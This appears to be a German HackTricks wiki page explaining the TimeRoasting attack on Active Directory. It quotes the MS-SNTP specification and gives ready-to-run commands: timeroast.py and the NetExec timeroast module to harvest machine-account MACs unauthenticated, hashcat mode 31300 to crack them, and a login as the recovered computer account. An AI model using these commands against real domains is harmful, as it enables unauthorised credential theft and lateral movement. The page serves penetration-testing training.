# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting missbraucht die veraltete MS-SNTP-Authentifizierungserweiterung. Bei MS-SNTP kann ein Client eine 68 Byte große Anfrage senden, die eine beliebige Computer-Account-RID enthält; der Domain Controller verwendet den NTLM-Hash (MD4) des Computer-Accounts als Schlüssel, um einen MAC über die Antwort zu berechnen, und gibt diesen zurück.<sup>[[1]](#references)</sup> Angreifer können diese MS-SNTP-MACs unauthentifiziert sammeln und offline cracken (Hashcat-Modus 31300), um Passwörter von Computer-Accounts wiederherzustellen.<sup>[[2]](#references)</sup>

Details finden sich in Abschnitt 3.1.5.1 „Authentication Request Behavior“ und Abschnitt 4 „Protocol Examples“ der offiziellen MS-SNTP-Spezifikation.<sup>[[1]](#references)</sup>
![TimeRoasting: Details finden sich in Abschnitt 3.1.5.1 „Authentication Request Behavior“ und Abschnitt 4 „Protocol Examples“ der offiziellen MS-SNTP-Spezifikation](../../images/Pasted%20image%2020250709114508.png)
Wenn das ADM-Element ExtendedAuthenticatorSupported auf false gesetzt ist, sendet der Client eine 68 Byte große Anfrage und bettet die RID in die 31 niederwertigsten Bits des Key-Identifier-Subfelds des Authenticators ein.<sup>[[1]](#references)</sup>

> Wenn das ADM-Element ExtendedAuthenticatorSupported auf false gesetzt ist, MUSS der Client eine Client-NTP-Request-Nachricht erstellen. Die Länge der Client-NTP-Request-Nachricht beträgt 68 Bytes. Der Client setzt das Authenticator-Feld der Client-NTP-Request-Nachricht wie in Abschnitt 2.2.1 beschrieben und schreibt die 31 niederwertigsten Bits des RID-Werts in die 31 niederwertigsten Bits des Key-Identifier-Subfelds des Authenticators. Anschließend schreibt er den Key-Selector-Wert in das höchstwertige Bit des Key-Identifier-Subfelds.<sup>[[1]](#references)</sup>

Aus Abschnitt 4 (Protocol Examples):

> Nach dem Empfang der Anfrage überprüft der Server, ob die Größe der empfangenen Nachricht 68 Bytes beträgt. Unter der Annahme, dass die Größe der empfangenen Nachricht 68 Bytes beträgt, extrahiert der Server die RID aus der empfangenen Nachricht. Der Server verwendet sie, um die Methode NetrLogonComputeServerDigest (wie in [MS-NRPC], Abschnitt 3.5.4.8.2, spezifiziert) aufzurufen, die Crypto-Checksums zu berechnen und die Crypto-Checksum anhand des höchstwertigen Bits des Key-Identifier-Subfelds der empfangenen Nachricht auszuwählen, wie in Abschnitt 3.2.5 spezifiziert. Anschließend sendet der Server eine Antwort an den Client, setzt das Key-Identifier-Feld auf 0 und das Crypto-Checksum-Feld auf die berechnete Crypto-Checksum.<sup>[[1]](#references)</sup>

Die Crypto-Checksum basiert auf MD5 (siehe 3.2.5.1.1) und kann offline gecrackt werden, wodurch der Roasting-Angriff ermöglicht wird.<sup>[[1]](#references)</sup>

## How to Attack

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting-Skripte von Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Praktischer Angriff (unauth) mit NetExec + Hashcat

- NetExec kann MS-SNTP-MACs für Computer-RIDs unauthenticated enumerieren und sammeln sowie für das Cracken bereite $sntp-ms$-Hashes ausgeben:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Offline mit Hashcat-Modus 31300 knacken (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Der wiederhergestellte Klartext entspricht dem Passwort eines Computerkontos. Versuche es direkt als Maschinenkonto mit Kerberos (-k), wenn NTLM deaktiviert ist:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Betriebliche Hinweise
- Stelle vor der Verwendung von Kerberos eine genaue Zeitsynchronisierung sicher: `sudo ntpdate <dc_fqdn>`
- Erstelle bei Bedarf eine krb5.conf für die AD-Realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Ordne RIDs später über LDAP/BloodHound den Principals zu, sobald du einen authentifizierten Foothold hast.

## Referenzen

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec – offizielle Dokumentation](https://www.netexec.wiki/)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
